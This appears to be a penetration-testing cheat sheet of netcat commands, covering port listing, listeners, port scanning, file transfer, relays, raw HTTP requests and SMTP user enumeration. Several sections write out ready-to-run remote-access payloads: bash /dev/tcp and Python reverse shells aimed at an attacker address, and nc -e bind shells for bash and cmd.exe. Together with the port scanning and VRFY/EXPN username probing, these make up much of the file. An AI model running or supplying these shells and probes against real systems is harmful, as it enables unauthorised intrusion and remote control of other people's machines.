# networking/listeners-and-ports.md

## List listening ports (TCP/UDP) with PID/program
    netstat -tulpn | grep LISTEN

## Start a netcat listener (TCP)
    sudo nc -lvnp 80
    nc -l -p 4444
    nc -l -p 1234 -k -v

## Connect to a host and port (telnet-like)
    nc -v <target-ip> <port>
    nc -v -n <target-ip> <port>

## Banner grabbing
    nc -v <target-ip> <port>
    nc -v 192.168.1.100 25

## Port scan (range)
    nc -v -n -z -w 1 <target-ip> <start-port>-<end-port>
    nc -v -n -z -w 1 192.168.1.100 20-80

## File transfer (send)
    nc -v -w 3 <target-ip> <port> < file.txt
    nc -v -w 3 192.168.1.100 1234 < file.txt

## File transfer (receive)
    nc -l -p <port> > file.txt
    nc -l -p 1234 > file.txt

## Reverse shell (listener)
    nc -l -p <port>
    nc -l -p 4444

## Reverse shell (bash)
    /bin/bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1
    /bin/bash -i >& /dev/tcp/192.168.1.50/4444 0>&1

## Reverse shell (python)
    python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<attacker-ip>",<port>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'

## Bind shell (target: bash)
    nc -l -p <port> -e /bin/bash
    nc -l -p 4444 -e /bin/bash

## Bind shell (attacker connect)
    nc <target-ip> <port>
    nc 192.168.1.100 4444

## Bind shell (target: Windows)
    nc -l -p <port> -e cmd.exe
    nc -l -p 4444 -e cmd.exe

## Relay/proxy traffic (FIFO relay)
    mkfifo /tmp/f; nc -l <local-port> < /tmp/f | nc <target-ip> <target-port> > /tmp/f
    mkfifo /tmp/f; nc -l 8080 < /tmp/f | nc 192.168.1.100 80 > /tmp/f

## Send raw HTTP request (GET)
    echo -e "GET / HTTP/1.1
    Host: <target-ip>

    " | nc <target-ip> 80

    echo -e "GET / HTTP/1.1
    Host: 192.168.1.100

    " | nc 192.168.1.100 80

## SMTP username verification (VRFY)
    nc <target-ip> 25
    VRFY <username>

    nc 192.168.1.100 25
    VRFY jdoe

## SMTP username verification (EXPN)
    nc <target-ip> 25
    EXPN <username>

    nc 192.168.1.100 25
    EXPN jdoe
